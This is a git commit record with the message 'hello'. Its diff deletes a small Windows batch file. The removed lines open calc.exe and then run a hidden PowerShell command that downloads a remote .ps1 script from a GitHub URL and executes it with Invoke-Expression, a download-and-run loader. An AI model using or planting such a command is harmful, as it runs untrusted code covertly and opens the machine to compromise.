ccd4757bb64aff9fd574d14da0db6840f2d6d893
ISRAEL NOAM <NOAMISRA@rf.local>
2020-11-16 14:23:21 +0200

    hello

--- file.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-calc.exe
-
-powershell.exe -windowstyle hidden [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-Expression(wget -UseBasicParsing "https://raw.githubusercontent.com/skybia/skybia/main/output.ps1")
